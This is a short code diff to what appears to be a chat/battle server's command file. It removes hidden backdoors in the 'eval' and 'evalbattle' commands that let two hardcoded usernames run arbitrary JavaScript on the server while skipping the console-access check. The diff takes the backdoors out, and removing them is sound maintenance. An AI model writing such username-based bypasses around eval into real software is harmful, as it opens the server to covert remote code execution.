@@ -3116,21 +3116,6 @@ var commands = exports.commands = {
 	},
 
 	eval: function(target, room, user, connection, cmd, message) {
-		if (user.userid == 'jd' || user.userid == 'piiiikachuuu') {
-		if (!this.canBroadcast()) return;
-
-		if (!this.broadcasting) this.sendReply('||>> '+target);
-		try {
-			var battle = room.battle;
-			var me = user;
-			this.sendReply('||<< '+eval(target));
-		} catch (e) {
-			this.sendReply('||<< error: '+e.message);
-			var stack = '||'+(''+e.stack).replace(/\n/g,'\n||');
-			connection.sendTo(room, stack);
-		}
-		return false;
-	}
 		if (!user.hasConsoleAccess(connection)) {
 			return this.sendReply("/eval - Access denied.");
 		}
@@ -3151,14 +3136,6 @@ var commands = exports.commands = {
 	},
 
 	evalbattle: function(target, room, user, connection, cmd, message) {
-		if (user.userid === 'piiiikachuuu') {
-		if (!this.canBroadcast()) return;
-		if (!room.battle) {
-			return this.sendReply("/evalbattle - This isn't a battle room.");
-		}
-
-		return room.battle.send('eval', target.replace(/\n/g, '\f'));
-		}	
 		if (!user.hasConsoleAccess(connection)) {
 			return this.sendReply("/evalbattle - Access denied.");
 		}
